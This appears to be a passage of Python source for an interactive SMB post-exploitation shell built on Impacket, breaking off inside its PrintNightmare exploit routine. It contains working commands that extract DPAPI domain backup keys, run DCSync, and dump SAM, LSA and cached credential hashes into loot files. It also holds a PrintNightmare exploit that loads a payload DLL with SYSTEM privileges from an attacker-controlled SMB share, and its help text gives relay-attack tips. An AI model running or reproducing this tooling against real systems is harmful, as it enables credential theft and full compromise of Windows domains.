                    print("    Key Length:     %d bytes" % backup_key['KeyLength'])
                    print("    Cert Length:    %d bytes" % backup_key['CertificateLength'])
                    print("    PVK Blob (Hex): 0x%s" % hexlify(backupkey_pvk).decode('latin-1'))
                    print("\n[+] Mimikatz Usage:")
                    print("    dpapi::cache /pvk:%s.pvk" % secret_name)
                    print("    dpapi::masterkey /in:\"%%APPDATA%%\\Microsoft\\Protect\\<SID>\\<guid>\" /pvk:%s.pvk" % secret_name)
                    print("\n[+] Impacket DPAPI Usage:")
                    print("    dpapi.py credential -pvk %s.pvk -file <cred_file>" % secret_name)

                    if export:
                        pvk_path = os.path.join(export_dir, "%s.pvk" % secret_name)
                        der_path = os.path.join(export_dir, "%s.der" % secret_name)
                        try:
                            with open(pvk_path, 'wb') as f:
                                f.write(backupkey_pvk)
                            print("[+] Exported private key to: %s" % pvk_path)
                            with open(der_path, 'wb') as f:
                                f.write(cert)
                            print("[+] Exported certificate to: %s" % der_path)
                        except Exception as e_write:
                            print("[-] Error writing files: %s" % e_write)
                else:
                    print("[!] Unknown key version: %d for %s" % (keyVersion, secret_name))

        except Exception as e:
            err_msg = str(e)
            print("[-] Error accessing LSA secrets on %s: %s" % (target, err_msg))
            if any(k in err_msg.lower() for k in ['access_denied', 'status_access_denied', '0x5', 'rpc_s_access_denied']):
                print("[-] Access Denied: Reading LSA secrets requires Domain Admin or SYSTEM privileges on the Domain Controller.")
                print("[*] Attempting fallback to MS-BKRP public key certificate retrieval...")
                for pipe in (r'\protected_storage', r'\lsarpc'):
                    dce_bkrp = None
                    try:
                        rpctransport_bkrp = transport.SMBTransport(target, filename=pipe, smb_connection=self.smb)
                        dce_bkrp = rpctransport_bkrp.get_dce_rpc()
                        dce_bkrp.connect()
                        dce_bkrp.bind(bkrp.MSRPC_UUID_BKRP)
                        resp_bkrp = bkrp.hBackuprKey(dce_bkrp, bkrp.BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID, NULL)
                        cert_data = b''.join(resp_bkrp['ppDataOut'])
                        print("[+] Successfully retrieved Domain Backup Key Certificate via MS-BKRP on %s (%d bytes)" % (pipe, len(cert_data)))
                        if export:
                            cert_out = os.path.join(export_dir, "domain_backupkey_cert.der")
                            with open(cert_out, 'wb') as f:
                                f.write(cert_data)
                            print("[+] Exported public certificate to: %s" % cert_out)
                        keys_extracted += 1
                        break
                    except Exception as e_bkrp:
                        continue
                    finally:
                        if dce_bkrp:
                            try:
                                dce_bkrp.disconnect()
                            except Exception:
                                pass
        finally:
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

        print("=" * 60)
        if keys_extracted > 0:
            print("[+] DPAPI Domain Backup Key extraction completed (%d key(s) retrieved)." % keys_extracted)
            if not export:
                print("[*] Tip: Run 'backupkey -export [dir]' to save .pvk, .der, and .key files to disk.")
        else:
            print("[-] No backup keys could be extracted.")
        print("=" * 60)

    def help_dcsync(self):
        print("""
Usage: dcsync [username] [-o <prefix>] [-full] [-pwd-last-set] [-history] [-user-status]

Extracts user credential hashes from Active Directory via DRSUAPI replication (Directory Replication Service).
Requires DRSUAPI replication privileges ("DS-Replication-Get-Changes" and "DS-Replication-Get-Changes-All"),
typically granted to Domain Admins, Enterprise Admins, and Domain Controller machine accounts.

Arguments:
  username                 Target username to dump (e.g. krbtgt, Administrator, contoso\\krbtgt).
                           If omitted or "all", dumps all domain user accounts.

Options:
  -o, -outputfile <prefix> Filename prefix to export dumped hashes (creates <prefix>.ntds, etc.)
  -full                    Extract Kerberos keys and cleartext credentials in addition to NTLM hashes
  -pwd-last-set            Include password last set timestamp in output
  -history                 Extract password history hashes
  -user-status             Display whether each account is enabled or disabled

Notes for NTLM Relay:
  - DRSUAPI operates over dynamic TCP RPC (not named pipes).
  - In an NTLM-relayed session, plaintext passwords and NTLM hashes are not known to authenticate
    a separate dynamic TCP RPC connection unless Kerberos tickets (KRB5CCNAME) are present.
  - If DCSync cannot authenticate over TCP, use 'backupkey' instead, which operates directly
    over the relayed SMB session via \\pipe\\lsarpc!
""")

    def complete_dcsync(self, text, line, begidx, endidx):
        options = ['krbtgt', 'Administrator', 'all', '-o', '-outputfile', '-full', '-pwd-last-set', '-history', '-user-status', '--help']
        return [o for o in options if o.startswith(text)]

    def do_dcsync(self, line):
        """dcsync [username] [-o <prefix>] [-full] [-pwd-last-set] [-history] [-user-status]
Performs DRSUAPI replication (DCSync) to extract domain account credentials and NTLM hashes.
Target user defaults to all domain accounts if not specified (e.g. 'dcsync krbtgt').
Requires DS-Replication-Get-Changes privileges (Domain Admin, Domain Controller)."""
        if self.smb is None or self.loggedIn is False:
            print("[-] No active SMB connection or not logged in")
            return

        parts = shlex.split(line) if line else []
        justUser = None
        output_prefix = None
        justNTLM = True
        pwdLastSet = False
        history = False
        printUserStatus = False

        i = 0
        while i < len(parts):
            p = parts[i]
            if p in ('-h', '--help'):
                self.help_dcsync()
                return
            elif p in ('-o', '-outputfile', '--outputfile'):
                if i + 1 < len(parts) and not parts[i + 1].startswith('-'):
                    output_prefix = parts[i + 1]
                    i += 1
                else:
                    print("[-] Error: -outputfile requires a filename prefix argument")
                    return
            elif p in ('-full', '--full'):
                justNTLM = False
            elif p in ('-pwd-last-set', '--pwd-last-set'):
                pwdLastSet = True
            elif p in ('-history', '--history'):
                history = True
            elif p in ('-user-status', '--user-status'):
                printUserStatus = True
            elif not p.startswith('-'):
                if justUser is None:
                    if p.lower() != 'all':
                        justUser = p
            i += 1

        target = self.smb.getRemoteHost()
        print("=" * 60)
        print("[*] DCSync (DRSUAPI Credential Replication)")
        print("[*] Target DC:     %s" % target)
        print("[*] Target User:   %s" % (justUser if justUser else "ALL Domain Users"))
        print("[*] NTLM Only:     %s" % ("Yes" if justNTLM else "No (extracting Kerberos keys / cleartext)"))
        if output_prefix:
            print("[*] Output Prefix: %s" % output_prefix)
        print("=" * 60)

        remoteOps = None
        ntds = None
        dumped_count = [0]

        def per_secret_callback(secret_type, secret):
            dumped_count[0] += 1
            print(secret)

        try:
            print("[*] Initializing RemoteOperations...")
            remoteOps = RemoteOperations(self.smb, self.use_kerberos, self.kdcHost)

            print("[*] Resolving domain name and domain SID...")
            domain_name = None
            try:
                machine_name, domain_name = remoteOps.getMachineNameAndDomain()
            except Exception:
                machine_name = self.smb.getServerName()
                domain_name = self.smb.getServerDomain()

            if not domain_name:
                domain_name = getattr(self, 'domain', '') or self.smb.getServerDomain() or self.smb.getServerDNSDomainName()

            if domain_name:
                print("[*] Target machine: %s, Domain: %s" % (machine_name, domain_name))
                try:
                    remoteOps.connectSamr(domain_name)
                    domain_sid = remoteOps.getDomainSid()
                    if domain_sid:
                        print("[+] Domain SID: %s" % domain_sid)
                except Exception as e_samr:
                    print("[!] SAMR resolution warning: %s" % e_samr)
            else:
                print("[!] Could not determine target domain name.")

            print("[*] Connecting to DRSUAPI RPC interface...")
            ntds = NTDSHashes(
                ntdsFile=None,
                bootKey=None,
                isRemote=True,
                history=history,
                noLMHash=True,
                remoteOps=remoteOps,
                useVSSMethod=False,
                remoteSSMethodWMINTDS=False,
                justNTLM=justNTLM,
                pwdLastSet=pwdLastSet,
                outputFileName=output_prefix,
                justUser=justUser,
                printUserStatus=printUserStatus,
                perSecretCallback=per_secret_callback
            )

            print("[*] Replicating directory credentials...")
            ntds.dump()

        except drsuapi.DCERPCSessionError as e:
            err_msg = str(e)
            print("[-] DRSUAPI Session Error: %s" % err_msg)
            if any(k in err_msg for k in ['0x2105', 'ERROR_DS_DRA_ACCESS_DENIED', 'access_denied']):
                print("[-] Access Denied: The account does not have replication rights ('DS-Replication-Get-Changes').")
                print("    Required permissions: Domain Admins, Enterprise Admins, or Domain Controllers.")
            elif 'ERROR_DS_NAME_ERROR_NOT_UNIQUE' in err_msg:
                print("[-] Duplicate account found. Try specifying NetBIOS domain name (e.g. 'DOMAIN\\%s')." % justUser)
            elif 'ERROR_DS_NAME_ERROR_NOT_FOUND' in err_msg:
                print("[-] Account '%s' not found in Active Directory." % justUser)
            elif 'ERROR_DS_DRA_BAD_DN' in err_msg:
                print("[-] Bad DN: The account lacks privileges or the domain object cannot be replicated.")
        except Exception as e:
            err_msg = str(e)
            print("[-] DCSync failed: %s" % err_msg)
            if any(k in err_msg.lower() for k in ['access_denied', 'rpc_s_access_denied', '0x5', 'status_access_denied', 'status_logon_failure']):
                print("[-] Authentication / Access Denied on DRSUAPI TCP RPC.")
                if not getattr(self, 'password', None) and not getattr(self, 'nthash', None) and not getattr(self, 'use_kerberos', False):
                    print("[!] Note: In an NTLM-relayed session, plaintext passwords/hashes are not known, and DRSUAPI runs over dynamic TCP RPC (not SMB named pipes).")
                    print("    Without Kerberos tickets (KRB5CCNAME), DRSUAPI cannot authenticate over TCP.")
                    print("    Use 'backupkey' instead! DPAPI Domain Backup Keys can be extracted directly over the relayed SMB session via \\pipe\\lsarpc.")
        finally:
            if ntds is not None:
                try:
                    ntds.finish()
                except Exception:
                    pass
            if remoteOps is not None:
                try:
                    remoteOps.finish()
                except Exception:
                    pass

        print("=" * 60)
        if dumped_count[0] > 0:
            print("[+] DCSync successful! Extracted %d credential record(s)." % dumped_count[0])
            if output_prefix:
                print("[+] Saved hashes to '%s.ntds'" % output_prefix)
        else:
            print("[-] No credentials dumped.")
        print("=" * 60)

    def help_secretsdump(self):
        print("""
================================================================================
secretsdump / dump_lsa / dump_sam - Local SAM & LSA Secrets Extraction
================================================================================
Dumps local SAM account hashes, cached domain logons (DCC2/mscache2), and
LSA secrets (service credentials, DPAPI system keys, SCCM Network Access Accounts)
directly over the active SMB session via \\pipe\\svcctl, \\pipe\\winreg, and ADMIN$.

Operates 100% within the authenticated SMB session using RemoteOperations without
requiring dynamic TCP RPC ports or out-of-band credentials.

Works on Domain Controllers, Member Servers (e.g. SCCM, SQL, Exchange, IIS),
and Workstations where administrative privileges exist on the target host.

Usage:
  secretsdump [options]
  dump_lsa [options]
  dump_sam [options]

Modes / Filters:
  secretsdump               Dump both SAM hashes and LSA secrets (default)
  dump_sam  / -sam          Dump only local SAM hashes
  dump_lsa  / -lsa          Dump only LSA secrets (and cached domain credentials)
  -cached                   Dump only cached domain logons (DCC2/mscache2)

Options:
  -sam                      Extract local SAM accounts and NTLM password hashes
  -lsa                      Extract LSA secrets (services, DPAPI, SCCM NAA)
  -cached                   Extract cached domain credentials (mscache2)
  -history                  Extract password history hashes
  -pwd-last-set             Display last password change timestamp for accounts
  -user-status              Display account status (Disabled, Expired, Locked)
  -o, --output <prefix>     Export dumped secrets to files (<prefix>.sam, <prefix>.secrets, <prefix>.cached)
  -h, --help                Show this help screen

Examples:
  1. Dump everything (SAM hashes, cached domain credentials, LSA secrets):
     # secretsdump

  2. Dump only LSA secrets (ideal on SCCM servers for NAA credentials):
     # dump_lsa
     # secretsdump -lsa

  3. Dump only local SAM hashes with user account status:
     # dump_sam -user-status
     # secretsdump -sam -user-status

  4. Export all dumped secrets to local loot files:
     # secretsdump -o loot/sccm01
================================================================================
""")

    def help_dump_lsa(self):
        self.help_secretsdump()

    def help_dump_sam(self):
        self.help_secretsdump()

    def help_dumplsa(self):
        self.help_secretsdump()

    def help_dumpsam(self):
        self.help_secretsdump()

    def help_dump_secrets(self):
        self.help_secretsdump()

    def complete_secretsdump(self, text, line, begidx, endidx):
        options = ['-sam', '-lsa', '-cached', '-history', '-pwd-last-set', '-user-status', '-o', '--output', '-h', '--help']
        if text:
            return [opt for opt in options if opt.startswith(text)]
        return options

    def complete_dump_lsa(self, text, line, begidx, endidx):
        return self.complete_secretsdump(text, line, begidx, endidx)

    def complete_dump_sam(self, text, line, begidx, endidx):
        return self.complete_secretsdump(text, line, begidx, endidx)

    def complete_dumplsa(self, text, line, begidx, endidx):
        return self.complete_secretsdump(text, line, begidx, endidx)

    def complete_dumpsam(self, text, line, begidx, endidx):
        return self.complete_secretsdump(text, line, begidx, endidx)

    def do_dump_lsa(self, line):
        self.do_secretsdump("-lsa " + line if line else "-lsa")

    def do_dumplsa(self, line):
        self.do_secretsdump("-lsa " + line if line else "-lsa")

    def do_dump_sam(self, line):
        self.do_secretsdump("-sam " + line if line else "-sam")

    def do_dumpsam(self, line):
        self.do_secretsdump("-sam " + line if line else "-sam")

    def do_dump_secrets(self, line):
        self.do_secretsdump(line)

    def do_secretsdump(self, line):
        """secretsdump [-sam] [-lsa] [-cached] [-history] [-pwd-last-set] [-user-status] [-o <prefix>]
Dumps local SAM account hashes, cached domain logons (DCC2), and LSA secrets via RemoteOperations.
Operates entirely over the active SMB session (named pipes \\pipe\\svcctl, \\pipe\\winreg, and ADMIN$).
Aliases: dump_lsa, dump_sam, dumplsa, dumpsam, dump_secrets."""
        if self.smb is None or self.loggedIn is False:
            print("[-] No active SMB connection or not logged in")
            return

        parts = shlex.split(line) if line else []
        do_sam = False
        do_lsa = False
        do_cached = False
        history = False
        pwdLastSet = False
        printUserStatus = False
        output_prefix = None

        i = 0
        while i < len(parts):
            p = parts[i]
            if p in ('-h', '--help'):
                self.help_secretsdump()
                return
            elif p in ('-sam', '--sam'):
                do_sam = True
            elif p in ('-lsa', '--lsa'):
                do_lsa = True
            elif p in ('-cached', '--cached'):
                do_cached = True
            elif p in ('-history', '--history'):
                history = True
            elif p in ('-pwd-last-set', '--pwd-last-set'):
                pwdLastSet = True
            elif p in ('-user-status', '--user-status'):
                printUserStatus = True
            elif p in ('-o', '--output', '-outputfile', '--outputfile'):
                if i + 1 < len(parts) and not parts[i + 1].startswith('-'):
                    output_prefix = parts[i + 1]
                    i += 1
                else:
                    print("[-] Error: -output requires a filename prefix argument")
                    return
            i += 1

        # If none of -sam, -lsa, -cached specified, dump all by default
        if not do_sam and not do_lsa and not do_cached:
            do_sam = True
            do_lsa = True
            do_cached = True
        elif do_lsa and not do_cached:
            # If -lsa was explicitly passed without -cached or -sam, include cached hashes as part of LSA
            do_cached = True

        if output_prefix:
            out_dir = os.path.dirname(output_prefix)
            if out_dir:
                try:
                    os.makedirs(out_dir, exist_ok=True)
                except Exception as e:
                    print("[-] Failed to create output directory '%s': %s" % (out_dir, e))
                    return

        target = self.smb.getRemoteHost()
        print("=" * 60)
        print("[*] SecretsDump (Local SAM, LSA & Cached Credential Extraction)")
        print("[*] Target Host: %s" % target)
        scope_items = []
        if do_sam:
            scope_items.append("SAM Hashes")
        if do_cached:
            scope_items.append("Cached Logons")
        if do_lsa:
            scope_items.append("LSA Secrets")
        print("[*] Scope:       %s" % ", ".join(scope_items))
        if output_prefix:
            print("[*] Output:      %s" % output_prefix)
        print("=" * 60)

        # SMBv1 compatibility flag
        try:
            if self.smb.getDialect() == smb.SMB_DIALECT:
                flags1, flags2 = self.smb.getSMBServer().get_flags()
                flags2 |= smb.SMB.FLAGS2_LONG_NAMES
                self.smb.getSMBServer().set_flags(flags2=flags2)
        except Exception:
            pass

        remoteOps = None
        samHashes = None
        lsaSecrets = None
        sam_dumped = [0]
        cached_dumped = [0]
        secrets_dumped = [0]

        try:
            print("[*] Initializing RemoteOperations...")
            remoteOps = RemoteOperations(self.smb, self.use_kerberos, self.kdcHost)

            print("[*] Enabling RemoteRegistry service via \\pipe\\svcctl...")
            try:
                remoteOps.enableRegistry()
            except Exception as e:
                err_str = str(e)
                print("[-] Failed to enable RemoteRegistry: %s" % err_str)
                if any(k in err_str.lower() for k in ['access_denied', 'rpc_s_access_denied', '0x5', 'status_access_denied']):
                    print("[-] Access Denied: Starting RemoteRegistry and reading registry hives requires local Administrator rights on %s." % target)
                return

            print("[*] Extracting BootKey (Syskey) from SYSTEM hive via \\pipe\\winreg...")
            bootKey = remoteOps.getBootKey()
            remoteOps._RemoteOperations__serviceDeleted = True

            # Dump SAM
            if do_sam:
                print("\n[*] " + "-" * 56)
                print("[*] Dumping Local SAM Hashes (uid:rid:lmhash:nthash)")
                print("[*] " + "-" * 56)
                try:
                    samFileName = remoteOps.saveSAM()

                    def sam_callback(secret):
                        sam_dumped[0] += 1
                        print(secret)
                        if self.outputfile:
                            try:
                                with open(self.outputfile, 'a') as f:
                                    f.write(secret + '\n')
                            except Exception:
                                pass

                    samHashes = SAMHashes(
                        samFileName,
                        bootKey,
                        isRemote=True,
                        history=history,
                        printUserStatus=printUserStatus,
                        perSecretCallback=sam_callback,
                        pwdLastSet=pwdLastSet
                    )
                    samHashes.dump()
                    if output_prefix:
                        samHashes.export(output_prefix)
                        print("[+] Exported SAM hashes to '%s.sam'" % output_prefix)
                except Exception as e:
                    print("[-] Failed to dump SAM hashes: %s" % e)

            # Dump LSA / Cached Hashes
            if do_lsa or do_cached:
                try:
                    securityFileName = remoteOps.saveSECURITY()

                    def lsa_callback(secretType, secret):
                        if secretType == LSASecrets.SECRET_TYPE.LSA_HASHED:
                            cached_dumped[0] += 1
                        else:
                            secrets_dumped[0] += 1
                        print(secret)
                        if self.outputfile:
                            try:
                                with open(self.outputfile, 'a') as f:
                                    f.write(secret + '\n')
                            except Exception:
                                pass

                    lsaSecrets = LSASecrets(
                        securityFileName,
                        bootKey,
                        remoteOps,
                        isRemote=True,
                        history=history,
                        perSecretCallback=lsa_callback
                    )

                    if do_cached:
                        print("\n[*] " + "-" * 56)
                        print("[*] Dumping Cached Domain Logon Hashes (DCC2/mscache2)")
                        print("[*] " + "-" * 56)
                        lsaSecrets.dumpCachedHashes()
                        if output_prefix:
                            lsaSecrets.exportCached(output_prefix)
                            print("[+] Exported cached hashes to '%s.cached'" % output_prefix)

                    if do_lsa:
                        print("\n[*] " + "-" * 56)
                        print("[*] Dumping LSA Secrets (Services, DPAPI, SCCM NAA)")
                        print("[*] " + "-" * 56)
                        lsaSecrets.dumpSecrets()
                        if output_prefix:
                            lsaSecrets.exportSecrets(output_prefix)
                            print("[+] Exported LSA secrets to '%s.secrets'" % output_prefix)

                except Exception as e:
                    print("[-] Failed to dump LSA secrets: %s" % e)

        except Exception as e:
            err_str = str(e)
            print("[-] SecretsDump failed: %s" % err_str)
            if any(k in err_str.lower() for k in ['access_denied', 'rpc_s_access_denied', '0x5', 'status_access_denied']):
                print("[-] Access Denied: The active SMB session does not have administrative rights to read the SAM/SECURITY hives.")
        finally:
            if samHashes is not None:
                try:
                    samHashes.finish()
                except Exception:
                    pass
            if lsaSecrets is not None:
                try:
                    lsaSecrets.finish()
                except Exception:
                    pass
            if remoteOps is not None:
                try:
                    remoteOps.finish()
                except Exception:
                    pass

        print("\n" + "=" * 60)
        print("[*] SecretsDump Finished!")
        if do_sam:
            print("[+] Local SAM Accounts Dumped: %d" % sam_dumped[0])
        if do_cached:
            print("[+] Cached Domain Logons:      %d" % cached_dumped[0])
        if do_lsa:
            print("[+] LSA Secrets Discovered:    %d" % secrets_dumped[0])
        if output_prefix:
            print("[*] Output Files:")
            if do_sam and sam_dumped[0] > 0:
                print("    SAM:     %s.sam" % output_prefix)
            if do_cached and cached_dumped[0] > 0:
                print("    Cached:  %s.cached" % output_prefix)
            if do_lsa and secrets_dumped[0] > 0:
                print("    Secrets: %s.secrets" % output_prefix)
        print("=" * 60)

    def help_printnightmare(self):
        print("""
================================================================================
PrintNightmare (CVE-2021-1675 / CVE-2021-34527) - Remote Code Execution & LPE
================================================================================
Exploits vulnerabilities in the Windows Print Spooler service (spoolsv.exe)
via MS-RPRN RPC over the authenticated SMB named pipe \\pipe\\spoolss.
Allows SYSTEM code execution or privilege escalation directly over the SMB session.

Modes:
  printnightmare --check               Non-intrusively check if target is vulnerable
  printnightmare --list                Enumerate installed printer drivers and paths
  printnightmare <dll_path> [options]  Exploit and trigger SYSTEM execution
  printnightmare --delete <driver>     Delete an added printer driver and unused files

Exploitation Examples:
  1. Vulnerability check:
     # printnightmare --check

  2. Remote UNC DLL (Attacker SMB share):
     # printnightmare \\\\10.3.10.150\\share\\payload.dll
     (Note: Ensure your SMB share allows anonymous/guest read access)

  3. Local DLL execution (Upload via SMB first, then execute as SYSTEM):
     # use C$
     # cd Windows\\Temp
     # put /path/to/payload.dll
     # printnightmare C:\\Windows\\Temp\\payload.dll

  4. Custom driver name and iteration count:
     # printnightmare \\\\10.3.10.150\\share\\payload.dll -d "HP LaserJet 4200" -t 50

  5. Enumerate drivers and clean up:
     # printnightmare --list
     # printnightmare --delete "HP LaserJet 4200"

Parameters:
  --dll <path>          UNC or local path to payload DLL
  -d, --driver-name     Custom printer driver name (default: auto-generated)
  -p, --driver-path     Base driver DLL path (default: auto-detected UNIDRV.DLL)
  -e, --env             Driver environment (default: 'Windows x64')
  -t, --tries           Max iterations to locate staged DLL (default: 30)
================================================================================
""")

    def complete_printnightmare(self, text, line, begidx, endidx):
        options = ['--check', '-c', '--list', '-l', '--dll', '--delete', '-d', '-p', '-e', '-t', '--help', '-h']
        if text:
            return [opt for opt in options if opt.startswith(text)]
        return options

    def _printnightmare_connect(self):
        """Connects and binds to MS-RPRN via \\pipe\\spoolss over the active SMB session."""
        target_host = self.smb.getRemoteHost()
        try:
            rpctransport = transport.SMBTransport(
                target_host,
                filename=r"\spoolss",
                smb_connection=self.smb
            )
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
            return dce
        except Exception as e:
            print("[-] Failed to connect/bind to \\pipe\\spoolss on %s: %s" % (target_host, str(e)))
            return None

    def _printnightmare_check(self, dce):
        """Non-intrusively checks vulnerability to CVE-2021-1675 by sending an empty driver container."""
        flags = rprn.APD_COPY_ALL_FILES | rprn.APD_COPY_FROM_DIRECTORY | rprn.APD_INSTALL_WARNED_DRIVER

        container = rprn.DRIVER_CONTAINER()
        container["Level"] = 2
        container["DriverInfo"]["tag"] = 2
        container["DriverInfo"]["Level2"]["cVersion"] = 0
        container["DriverInfo"]["Level2"]["pName"] = NULL
        container["DriverInfo"]["Level2"]["pEnvironment"] = NULL
        container["DriverInfo"]["Level2"]["pDriverPath"] = NULL
        container["DriverInfo"]["Level2"]["pDataFile"] = NULL
        container["DriverInfo"]["Level2"]["pConfigFile"] = NULL

        try:
            rprn.hRpcAddPrinterDriverEx(
                dce,
                pName=NULL,
                pDriverContainer=container,
                dwFileCopyFlags=flags,
            )
            return True, "Driver addition accepted without access checks (VULNERABLE)"
        except rprn.DCERPCSessionError as e:
            if e.error_code == RPC_E_ACCESS_DENIED:
                return False, f"Target returned RPC_E_ACCESS_DENIED (0x{e.error_code:x}). Driver addition restricted to Administrators (PATCHED against CVE-2021-1675)."
            elif e.error_code == system_errors.ERROR_INVALID_PARAMETER:
                return True, f"Target returned ERROR_INVALID_PARAMETER (0x{e.error_code:x} / 87). Security check passed! Non-admin driver addition allowed (VULNERABLE to CVE-2021-1675)."
            else:
                return False, f"Target returned error: {e}"
        except DCERPCException as e:
            err_str = str(e)
            if "access_denied" in err_str.lower():
                return False, "Target returned rpc_s_access_denied (PATCHED against CVE-2021-1675)."
            return False, f"RPC error during check: {e}"

    def _printnightmare_list(self, dce, environment="Windows x64"):
        """Enumerates installed printer drivers via RpcEnumPrinterDrivers."""
        try:
            resp = rprn.hRpcEnumPrinterDrivers(dce, pName=NULL, pEnvironment=rprn.checkNullString(environment), Level=2)
        except Exception as e:
            print("[-] Failed to enumerate printer drivers: %s" % str(e))
            return []

        pDrivers = resp['pDrivers']
        if isinstance(pDrivers, list):
            data = b"".join(pDrivers)
        elif isinstance(pDrivers, bytes):
            data = pDrivers
        else:
            data = bytes(pDrivers)

        blobs = DRIVER_INFO_2_ARRAY(data, resp['pcReturned'])
        return blobs['drivers']

    def _printnightmare_get_driver_path(self, dce, environment="Windows x64"):
        """Finds base UNIDRV.DLL path on target."""
        drivers = self._printnightmare_list(dce, environment)
        # 1. Search for DriverPath in FileRepository
        for d in drivers:
            drv = d.get('DriverPath', '')
            if "filerepository" in drv.lower():
                parent = ntpath.dirname(drv)
                return ntpath.join(parent, "UNIDRV.DLL")
        # 2. Search for any driver referencing UNIDRV.DLL
        for d in drivers:
            drv = d.get('DriverPath', '')
            if "unidrv.dll" in drv.lower():
                return drv
        # 3. Search for any valid DLL in drivers
        for d in drivers:
            drv = d.get('DriverPath', '')
            if drv and drv.lower().endswith(".dll"):
                return drv
        # 4. Check driver directory via RpcGetPrinterDriverDirectory
        try:
            resp = rprn.hRpcGetPrinterDriverDirectory(dce, pName=NULL, pEnvironment=rprn.checkNullString(environment), Level=1)
            raw = b"".join(resp['pDriverDirectory']) if isinstance(resp['pDriverDirectory'], list) else bytes(resp['pDriverDirectory'])
            path_str = raw.decode("utf-16-le", errors="ignore").split("\x00")[0]
            if path_str:
                return ntpath.join(path_str, "UNIDRV.DLL")
        except Exception:
            pass
        return None

    def _printnightmare_delete(self, dce, driver_name, environment="Windows x64"):
        """Deletes a printer driver and unused files via RpcDeletePrinterDriverEx."""
        print(f"[*] Deleting printer driver '{driver_name}' and unused files...")
        try:
            hRpcDeletePrinterDriverEx(dce, pName=NULL, pEnvironment=environment, pDriverName=driver_name, dwDeleteFlag=DPD_DELETE_UNUSED_FILES, dwVersionNum=0)
            print(f"[+] Driver '{driver_name}' deleted successfully.")
            return True
        except rprn.DCERPCSessionError as e:
            if e.error_code == RPC_E_ACCESS_DENIED:
                print(f"[-] Access denied deleting driver (requires Administrator): {e}")
            else:
                print(f"[-] Error deleting driver: {e}")
            return False
        except Exception as e:
            print(f"[-] Failed to delete driver: {e}")
            return False

    def _printnightmare_exploit(self, dce, dll_path, driver_name=None, driver_path=None, environment="Windows x64", max_tries=30):
        """Executes PrintNightmare payload via UNC staging or local file execution."""
        clean_dll = dll_path.replace('/', '\\')
        is_unc = clean_dll.startswith('\\\\') or clean_dll.startswith('\\??\\UNC\\')

        if not driver_name:
            driver_name = "Generic Print Driver " + "".join(random.choices(string.digits, k=4))

        if not driver_path:
            print("[*] Enumerating base driver path from target...")
            driver_path = self._printnightmare_get_driver_path(dce, environment)
            if driver_path:
                print(f"[+] Found base driver path: {driver_path}")
            else:
                driver_path = r"C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
                print(f"[*] Using standard default driver path: {driver_path}")

        print(f"[*] Target Driver Name: {driver_name}")
        print(f"[*] Base Driver Path:   {driver_path}")
        print(f"[*] Payload DLL:        {clean_dll}")

        flags = rprn.APD_COPY_ALL_FILES | rprn.APD_COPY_FROM_DIRECTORY | rprn.APD_INSTALL_WARNED_DRIVER

        container = rprn.DRIVER_CONTAINER()
        container['Level'] = 2
        container['DriverInfo']['tag'] = 2
        container['DriverInfo']['Level2']['cVersion'] = 3
        container['DriverInfo']['Level2']['pName'] = rprn.checkNullString(driver_name)
        container['DriverInfo']['Level2']['pEnvironment'] = rprn.checkNullString(environment)
        container['DriverInfo']['Level2']['pDriverPath'] = rprn.checkNullString(driver_path)

        # Local DLL execution mode
        if not is_unc:
            print(f"[*] Local DLL execution mode: Loading {clean_dll} directly via pConfigFile...")
            container['DriverInfo']['Level2']['pDataFile'] = rprn.checkNullString(clean_dll)
            container['DriverInfo']['Level2']['pConfigFile'] = rprn.checkNullString(clean_dll)
            try:
                resp = rprn.hRpcAddPrinterDriverEx(dce, pName=NULL, pDriverContainer=container, dwFileCopyFlags=flags)
                err = resp.get('ErrorCode', 0) if isinstance(resp, dict) else getattr(resp, 'ErrorCode', 0)
                if err == 0:
                    print(f"[+] SUCCESS! Local DLL '{clean_dll}' loaded by spoolsv.exe with SYSTEM privileges!")
                    return True
                else:
                    print(f"[-] RpcAddPrinterDriverEx returned error code: {err}")
                    return False
            except rprn.DCERPCSessionError as e:
                if e.error_code == RPC_E_ACCESS_DENIED:
                    print(f"[-] Failed: RPC_E_ACCESS_DENIED (0x{e.error_code:x}). Requires Administrator privileges or target is patched.")
                else:
                    print(f"[-] Local execution failed: {e}")
                return False
            except Exception as e:
                print(f"[-] Local execution unexpected error: {e}")
                return False

        # Remote UNC staging mode
        print(f"[*] Remote UNC DLL mode: Staging payload from {clean_dll}...")
        unc_variants = [clean_dll]
        if clean_dll.startswith('\\\\') and not clean_dll.startswith('\\??\\UNC\\'):
            unc_variants.append(r"\??\UNC" + clean_dll[1:])

        staged = False
        for unc in unc_variants:
            print(f"[*] Stage 1: Pushing payload via UNC {unc}...")
            container['DriverInfo']['Level2']['pDataFile'] = rprn.checkNullString(unc)
            container['DriverInfo']['Level2']['pConfigFile'] = rprn.checkNullString("C:\\Windows\\System32\\kernelbase.dll")
            try:
                resp = rprn.hRpcAddPrinterDriverEx(dce, pName=NULL, pDriverContainer=container, dwFileCopyFlags=flags)
                err = resp.get('ErrorCode', 0) if isinstance(resp, dict) else getattr(resp, 'ErrorCode', 0)
                print(f"[+] Stage 1 completed (ErrorCode: {err})! Remote DLL staged to spooler directory.")
                staged = True
                break
            except rprn.DCERPCSessionError as e:
                if e.error_code == RPC_E_ACCESS_DENIED:
                    print(f"[-] Stage 1 failed: RPC_E_ACCESS_DENIED (0x{e.error_code:x}). Requires Administrator privileges or target is patched against CVE-2021-1675.")
                    return False
                elif e.error_code == system_errors.ERROR_BAD_NET_RESP:
                    print(f"[-] Stage 1 failed: ERROR_BAD_NET_RESP (0x{e.error_code:x}). Target could not fetch UNC path. Verify your SMB share allows anonymous/guest read access.")
                    return False
                elif e.error_code == system_errors.ERROR_INVALID_PARAMETER:
                    print(f"[-] Stage 1 with {unc} returned ERROR_INVALID_PARAMETER (0x{e.error_code:x}).")
                    continue
                else:
                    print(f"[-] Stage 1 error: {e}")
                    continue
            except Exception as e:
                print(f"[-] Stage 1 unexpected exception: {e}")
                continue

        if not staged:
            print("[-] Stage 1 failed for all UNC variants. Remote UNC paths may be blocked (CVE-2021-34527 patch).")
            print("[*] Pro-tip: You can upload your DLL via SMB ('put <dll>') and execute it locally:")
            print(f"    # printnightmare C:\\Windows\\Temp\\{ntpath.basename(clean_dll)}")
            return False

        # Stage 2: Trigger execution
